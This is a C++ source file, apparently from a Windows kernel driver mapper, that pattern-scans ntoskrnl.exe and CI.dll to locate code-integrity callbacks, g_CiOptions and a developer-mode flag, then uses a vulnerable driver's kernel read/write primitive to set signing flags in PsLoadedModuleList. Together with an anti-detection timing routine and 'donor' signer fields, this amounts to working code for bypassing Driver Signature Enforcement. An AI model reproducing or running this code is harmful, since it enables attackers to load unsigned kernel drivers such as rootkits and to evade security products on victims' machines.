#include "Mapper.h"
#include <stdio.h>
#include <Psapi.h>
#pragma comment(lib, "Psapi.lib")

pNtQuerySystemInformation NtQuerySystemInformationPtr = nullptr;
pNtLoadDriver NtLoadDriverPtr = nullptr;
pNtUnloadDriver NtUnloadDriverPtr = nullptr;
pRtlAdjustPrivilege RtlAdjustPrivilegePtr = nullptr;
pRtlGetFullPathName_UEx RtlGetFullPathName_UExPtr = nullptr;
pRtlCreateRegistryKey RtlCreateRegistryKeyPtr = nullptr;
pRtlWriteRegistryValue RtlWriteRegistryValuePtr = nullptr;
pNtDeviceIoControlFile NtDeviceIoControlFilePtr = nullptr;
pNtDeleteKey NtDeleteKeyPtr = nullptr;
pNtOpenKey NtOpenKeyPtr = nullptr;
pNtFlushKey NtFlushKeyPtr = nullptr;
pNtCreateFile NtCreateFilePtr = nullptr;
pNtSetInformationFile NtSetInformationFilePtr = nullptr;

WCHAR g_LoaderServicePath[128] = { 0 };
WCHAR g_DriverServicePath[128] = { 0 };

PVOID g_OriginalCiCallback = nullptr;
PVOID g_CiCallbackAddress = nullptr;
bool g_CiCallbackPatched = false;

PVOID g_CiOptionsAddress = nullptr;
DWORD g_OriginalCiOptions = 0;
bool g_CiOptionsPatched = false;

PVOID g_CiDevModeAddress = nullptr;
DWORD g_OriginalCiDevMode = 0;
bool g_CiDevModePatched = false;

bool g_KernelSigningVerified = false;
DWORD g_PatchedFlags = 0;
PVOID g_DriverLoadAddress = nullptr;
WCHAR g_DonorCopyPath[520] = { 0 };
WCHAR g_DonorSignerName[256] = { 0 };


WCHAR g_SentinelServicePath[128] = { 0 };
PVOID g_SentinelLoadAddress = nullptr;
ULONG g_SentinelImageSize = 0;

struct WindowsVersion {
    DWORD major;
    DWORD minor;
    DWORD build;
    bool isWindows11;
};

static WindowsVersion GetWindowsVersion() {
    WindowsVersion ver = { 0, 0, 0, false };

    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll) {
        RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
        if (RtlGetVersion) {
            RTL_OSVERSIONINFOW osvi = { 0 };
            osvi.dwOSVersionInfoSize = sizeof(osvi);
            if (RtlGetVersion(&osvi) == 0) {
                ver.major = osvi.dwMajorVersion;
                ver.minor = osvi.dwMinorVersion;
                ver.build = osvi.dwBuildNumber;
                ver.isWindows11 = (ver.major >= 10 && ver.build >= 22000);
            }
        }
    }
    return ver;
}

namespace KernelUtils {

    PVOID GetKernelModuleBase(const char* moduleName) {
        NTSTATUS status;
        ULONG returnLength = 0;
        PVOID buffer = nullptr;

        if (!NtQuerySystemInformationPtr) {
            return nullptr;
        }

        status = NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
        while (status == STATUS_INFO_LENGTH_MISMATCH) {
            if (buffer) {
                VirtualFree(buffer, 0, MEM_RELEASE);
            }
            buffer = VirtualAlloc(nullptr, returnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!buffer) {
                return nullptr;
            }
            status = NtQuerySystemInformationPtr(11, buffer, returnLength, &returnLength);
        }

        if (!NT_SUCCESS(status)) {
            if (buffer) {
                VirtualFree(buffer, 0, MEM_RELEASE);
            }
            return nullptr;
        }

        PRTL_PROCESS_MODULES moduleInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
        PVOID result = nullptr;

        for (ULONG i = 0; i < moduleInfo->NumberOfModules; i++) {
            auto& mod = moduleInfo->Modules[i];
            auto currentName = reinterpret_cast<const char*>(
                mod.FullPathName + mod.OffsetToFileName
            );


            if (i < 5) {
            }

            if (_stricmp(currentName, moduleName) == 0) {
                result = mod.ImageBase;
                break;
            }
        }

        VirtualFree(buffer, 0, MEM_RELEASE);


        if (!result && _stricmp(moduleName, "ntoskrnl.exe") == 0) {
            LPVOID drivers[1024];
            DWORD cbNeeded = 0;
            if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {

                if (cbNeeded >= sizeof(LPVOID) && drivers[0] != nullptr) {
                    result = drivers[0];
                } else {
                }
            } else {
            }
        }

        if (!result) {
        }

        return result;
    }

    PVOID GetKernelProcAddress(PVOID moduleBase, const char* procName) {
        HMODULE localModule = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localModule) {
            return nullptr;
        }

        PVOID localProc = GetProcAddress(localModule, procName);
        if (!localProc) {
            FreeLibrary(localModule);
            return nullptr;
        }

        ULONG_PTR offset = reinterpret_cast<ULONG_PTR>(localProc) -
            reinterpret_cast<ULONG_PTR>(localModule);

        FreeLibrary(localModule);

        PVOID result = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(moduleBase) + offset
        );

        return result;
    }

    BOOL GetCiValidateImageHeaderEntry(PVOID* outCiEntry, PVOID* outZwFlush) {
        AntiDetect::TimingJitter();

        WindowsVersion winVer = GetWindowsVersion();
        PVOID ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
        if (!ntoskrnlBase) {
            return FALSE;
        }

        HMODULE localModule = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localModule) {
            return FALSE;
        }

        MODULEINFO modinfo = { 0 };
        if (!K32GetModuleInformation(GetCurrentProcess(), localModule, &modinfo, sizeof(modinfo))) {
            FreeLibrary(localModule);
            return FALSE;
        }

        struct CiPattern {
            BYTE bytes[16];
            DWORD length;
            DWORD leaOffset;
            const char* name;
        };


        CiPattern win10Patterns[] = {


            { { 0xFF, 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 }, 7, 4, "Win10 call; mov rdx,rbx; lea r8" },


            { { 0xFF, 0x48, 0x8B, 0xCB, 0x4C, 0x8D, 0x05 }, 7, 4, "Win10 call; mov rcx,rbx; lea r8" },
        };


        CiPattern win11Patterns[] = {
            { { 0x41, 0xB8, 0x05, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0D }, 9, 6, "Win11 25H2 mov r8d,5; lea r9" },
        };

        CiPattern universalPatterns[] = {

            { { 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 }, 6, 3, "Universal mov rdx,rbx; lea r8" },
            { { 0x48, 0x8B, 0xCB, 0x4C, 0x8D, 0x05 }, 6, 3, "Universal mov rcx,rbx; lea r8" },

            { { 0x4C, 0x8D, 0x0D }, 3, 0, "Universal lea r9" },
        };

        BYTE* searchBase = reinterpret_cast<BYTE*>(localModule);
        BYTE* foundAddr = nullptr;
        DWORD leaInstructionOffset = 0;
        const char* matchedPattern = nullptr;

        auto searchPattern = [&](CiPattern* patterns, int count) -> bool {
            for (int p = 0; p < count; p++) {
                CiPattern& pat = patterns[p];
                for (DWORD offset = 0; offset < modinfo.SizeOfImage - pat.length; offset++) {
                    bool match = true;
                    for (DWORD j = 0; j < pat.length; j++) {
                        if (searchBase[offset + j] != pat.bytes[j]) {
                            match = false;
                            break;
                        }
                    }
                    if (match) {
                        BYTE* leaAddr = searchBase + offset + pat.leaOffset;
                        INT32 leaOff = *reinterpret_cast<INT32*>(leaAddr + 3);
                        ULONG_PTR targetAddr = reinterpret_cast<ULONG_PTR>(leaAddr) + 7 + static_cast<INT64>(leaOff);
                        ULONG_PTR targetOffset = targetAddr - reinterpret_cast<ULONG_PTR>(localModule);

                        if (targetOffset < modinfo.SizeOfImage) {
                            if (pat.length <= 3) {
                                if (targetOffset > modinfo.SizeOfImage / 2) {
                                    DWORD* targetData = reinterpret_cast<DWORD*>(targetAddr);
                                    if (*targetData == 256 || *targetData == 0 || *targetData >= 100) {
                                        foundAddr = leaAddr;
                                        leaInstructionOffset = pat.leaOffset;
                                        matchedPattern = pat.name;
                                        return true;
                                    }
                                }
                            } else {
                                foundAddr = leaAddr;
                                leaInstructionOffset = pat.leaOffset;
                                matchedPattern = pat.name;
                                return true;
                            }
                        }
                    }
                }
            }
            return false;
        };

        bool found = false;
        if (winVer.isWindows11) {
            found = searchPattern(win11Patterns, sizeof(win11Patterns) / sizeof(win11Patterns[0]));
            if (!found) {
                found = searchPattern(win10Patterns, sizeof(win10Patterns) / sizeof(win10Patterns[0]));
            }
        } else {
            found = searchPattern(win10Patterns, sizeof(win10Patterns) / sizeof(win10Patterns[0]));
            if (!found) {
                found = searchPattern(win11Patterns, sizeof(win11Patterns) / sizeof(win11Patterns[0]));
            }
        }

        if (!found) {
            found = searchPattern(universalPatterns, sizeof(universalPatterns) / sizeof(universalPatterns[0]));
        }

        if (!foundAddr) {
            FreeLibrary(localModule);
            return FALSE;
        }

        INT32 leaOffset = *reinterpret_cast<INT32*>(foundAddr + 3);

        ULONG_PTR seCiCallbacksLocal = reinterpret_cast<ULONG_PTR>(foundAddr) + 7 + static_cast<INT64>(leaOffset);

        ULONG_PTR kernelOffset = seCiCallbacksLocal - reinterpret_cast<ULONG_PTR>(localModule);

        if (kernelOffset >= modinfo.SizeOfImage) {
            FreeLibrary(localModule);
            return FALSE;
        }

        PVOID seCiCallbacksKernel = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(ntoskrnlBase) + kernelOffset
        );

        PVOID zwFlushLocal = GetProcAddress(localModule, "ZwFlushInstructionCache");
        if (!zwFlushLocal) {
            FreeLibrary(localModule);
            return FALSE;
        }

        PVOID zwFlushKernel = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(zwFlushLocal) -
            reinterpret_cast<ULONG_PTR>(localModule) +
            reinterpret_cast<ULONG_PTR>(ntoskrnlBase)
        );

        PVOID ciValidateImageHeaderEntry = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(seCiCallbacksKernel) + 0x20
        );

        FreeLibrary(localModule);

        if (outCiEntry) {
            *outCiEntry = ciValidateImageHeaderEntry;
        }
        if (outZwFlush) {
            *outZwFlush = zwFlushKernel;
        }

        return TRUE;
    }

    BOOL PatchDriverSigningFlags(HANDLE device, PCWSTR driverFileName) {
        char narrowName[256] = {};
        WideCharToMultiByte(CP_ACP, 0, driverFileName, -1, narrowName, sizeof(narrowName), NULL, NULL);

        PVOID driverBase = nullptr;
        {
            ULONG returnLength = 0;
            NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
            if (returnLength == 0) return FALSE;
            PVOID buffer = VirtualAlloc(nullptr, returnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!buffer) return FALSE;
            NTSTATUS st = NtQuerySystemInformationPtr(11, buffer, returnLength, &returnLength);
            if (NT_SUCCESS(st)) {
                PRTL_PROCESS_MODULES modInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
                for (ULONG i = 0; i < modInfo->NumberOfModules; i++) {
                    auto& m = modInfo->Modules[i];
                    const char* name = reinterpret_cast<const char*>(m.FullPathName + m.OffsetToFileName);
                    if (_stricmp(name, narrowName) == 0) {
                        driverBase = m.ImageBase;
                        break;
                    }
                }
            }
            VirtualFree(buffer, 0, MEM_RELEASE);
        }

        if (!driverBase) {
            return FALSE;
        }
        HMODULE localNtos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localNtos) return FALSE;
        PVOID localPsLML = GetProcAddress(localNtos, "PsLoadedModuleList");
        if (!localPsLML) {
            FreeLibrary(localNtos);
            return FALSE;
        }
        PVOID ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
        if (!ntoskrnlBase) {
            FreeLibrary(localNtos);
            return FALSE;
        }
        ULONG_PTR pmlOffset = reinterpret_cast<ULONG_PTR>(localPsLML) - reinterpret_cast<ULONG_PTR>(localNtos);
        FreeLibrary(localNtos);
        PVOID pPsLoadedModuleList = reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(ntoskrnlBase) + pmlOffset);

        ULONG_PTR listFlink = 0;
        NTSTATUS status = VulnDriver::ReadKernelMemory(device, pPsLoadedModuleList, &listFlink, sizeof(listFlink));
        if (!NT_SUCCESS(status) || !listFlink) {
            return FALSE;
        }

        ULONG_PTR headAddr = reinterpret_cast<ULONG_PTR>(pPsLoadedModuleList);
        ULONG_PTR current = listFlink;

        for (int i = 0; i < 1024 && current != headAddr; i++) {
            PVOID entryDllBase = nullptr;
            status = VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x30), &entryDllBase, sizeof(entryDllBase));
            if (!NT_SUCCESS(status)) break;

            if (entryDllBase == driverBase) {
                DWORD flags = 0;
                VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &flags, sizeof(flags));
                flags |= 0x20;
                status = VulnDriver::WriteKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &flags, sizeof(flags));
                if (!NT_SUCCESS(status)) {
                    return FALSE;
                }

                DWORD verifyFlags = 0;
                VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current + 0x68), &verifyFlags, sizeof(verifyFlags));

                g_DriverLoadAddress = driverBase;
                g_PatchedFlags = verifyFlags;
                g_KernelSigningVerified = (verifyFlags & 0x20) != 0;

                if (g_KernelSigningVerified) {
                } else {
                }
                return TRUE;
            }

            ULONG_PTR nextFlink = 0;
            VulnDriver::ReadKernelMemory(device, reinterpret_cast<PVOID>(current), &nextFlink, sizeof(nextFlink));
            if (!nextFlink || nextFlink == current) break;
            current = nextFlink;
        }

        return FALSE;
    }

    BOOL GetCiOptionsAddress(PVOID* outAddress) {
        PVOID ciBase = GetKernelModuleBase("CI.dll");
        if (!ciBase) {
            return FALSE;
        }
        HMODULE localCi = LoadLibraryExW(L"CI.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localCi) {
            return FALSE;
        }

        MODULEINFO modinfo = { 0 };
        if (!K32GetModuleInformation(GetCurrentProcess(), localCi, &modinfo, sizeof(modinfo))) {
            FreeLibrary(localCi);
            return FALSE;
        }

        BYTE* base = reinterpret_cast<BYTE*>(localCi);
        PVOID optionsLocal = nullptr;


        for (DWORD i = 0; i + 30 < modinfo.SizeOfImage; i++) {
            if (base[i] != 0x8B || base[i + 1] != 0x05) continue;

            bool foundTest = false;
            for (DWORD j = 6; j < 20 && (i + j + 1) < modinfo.SizeOfImage; j++) {
                if (base[i + j] == 0xA8 && base[i + j + 1] == 0x08) {
                    foundTest = true;
                    break;
                }
            }
            if (!foundTest) continue;

            bool foundTestFlags = false;
            for (DWORD j = 6; j < 30 && (i + j + 9) < modinfo.SizeOfImage; j++) {
                if (base[i + j] == 0xF7 && base[i + j + 1] == 0x05 &&
                    base[i + j + 6] == 0x00 && base[i + j + 7] == 0x04 &&
                    base[i + j + 8] == 0x00 && base[i + j + 9] == 0x00) {
                    foundTestFlags = true;
                    break;
                }
            }
            if (!foundTestFlags) continue;

            INT32 ripOffset = *reinterpret_cast<INT32*>(&base[i + 2]);
            BYTE* target = &base[i + 6] + ripOffset;

            ULONG_PTR localOffset = reinterpret_cast<ULONG_PTR>(target) - reinterpret_cast<ULONG_PTR>(localCi);
            if (localOffset < modinfo.SizeOfImage) {
                optionsLocal = target;
                break;
            }
        }

        if (!optionsLocal) {
            FreeLibrary(localCi);
            return FALSE;
        }

        ULONG_PTR offset = reinterpret_cast<ULONG_PTR>(optionsLocal) - reinterpret_cast<ULONG_PTR>(localCi);
        FreeLibrary(localCi);

        *outAddress = reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(ciBase) + offset);
        return TRUE;
    }

    BOOL GetCiDeveloperModeAddress(PVOID* outAddress) {
        PVOID ciBase = GetKernelModuleBase("CI.dll");
        if (!ciBase) {
            return FALSE;
        }

        HMODULE localCi = LoadLibraryExW(L"CI.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!localCi) {
            return FALSE;
        }

        MODULEINFO modinfo = { 0 };
        if (!K32GetModuleInformation(GetCurrentProcess(), localCi, &modinfo, sizeof(modinfo))) {
            FreeLibrary(localCi);
            return FALSE;
        }

        BYTE* base = reinterpret_cast<BYTE*>(localCi);
        PVOID devModeLocal = nullptr;


        for (DWORD i = 0; i + 23 < modinfo.SizeOfImage; i++) {
            if (base[i] == 0xF6 && base[i + 1] == 0x05 &&
                base[i + 6] == 0x01 &&
                base[i + 7] == 0x74 &&
                base[i + 9] == 0x48 && base[i + 10] == 0x8B &&
                base[i + 11] == 0x45 && base[i + 12] == 0x08 &&
                base[i + 13] == 0x83 && base[i + 14] == 0xCB &&
                base[i + 15] == 0x10 &&
                base[i + 16] == 0xF7 && base[i + 17] == 0x40 &&
                base[i + 18] == 0x30 && base[i + 19] == 0x00 &&
                base[i + 20] == 0x01 && base[i + 21] == 0x00 &&
                base[i + 22] == 0x00) {

                INT32 ripOffset = *reinterpret_cast<INT32*>(&base[i + 2]);
                BYTE* target = &base[i + 7] + ripOffset;
                target -= 2;

                ULONG_PTR localOffset = reinterpret_cast<ULONG_PTR>(target) - reinterpret_cast<ULONG_PTR>(localCi);
                if (localOffset < modinfo.SizeOfImage) {
                    devModeLocal = target;
                    break;
                }
            }
        }

        if (!devModeLocal) {
            FreeLibrary(localCi);
            return FALSE;
        }

        ULONG_PTR offset = reinterpret_cast<ULONG_PTR>(devModeLocal) - reinterpret_cast<ULONG_PTR>(localCi);
        FreeLibrary(localCi);

        *outAddress = reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(ciBase) + offset);
        return TRUE;
    }

    PVOID GetDriverBaseByName(PCWSTR driverFileName, PULONG outImageSize) {


        if (!NtQuerySystemInformationPtr) {
            return nullptr;
        }

        ULONG returnLength = 0;
        NTSTATUS status = NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
        if (returnLength == 0) {
            return nullptr;
        }


        ULONG bufSize = returnLength + 4096;
        PVOID buffer = VirtualAlloc(nullptr, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) {
            return nullptr;
        }

        status = NtQuerySystemInformationPtr(11, buffer, bufSize, &returnLength);
        if (!NT_SUCCESS(status)) {
            VirtualFree(buffer, 0, MEM_RELEASE);
            return nullptr;
        }


        PRTL_PROCESS_MODULES moduleInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
        PVOID result = nullptr;
        ULONG resultSize = 0;

        char targetNarrow[260] = {};
        WideCharToMultiByte(CP_ACP, 0, driverFileName, -1, targetNarrow, sizeof(targetNarrow), NULL, NULL);

        for (ULONG i = 0; i < moduleInfo->NumberOfModules; i++) {
            auto& mod = moduleInfo->Modules[i];
            const char* fileName = reinterpret_cast<const char*>(
                mod.FullPathName + mod.OffsetToFileName);

            if (i == 0) {
            }

            if (_stricmp(fileName, targetNarrow) == 0) {
                result = mod.ImageBase;
                resultSize = mod.ImageSize;
                break;
            }
        }

        VirtualFree(buffer, 0, MEM_RELEASE);

        if (result) {
            if (outImageSize)
                *outImageSize = resultSize;
            return result;
        }

        return nullptr;
    }

}
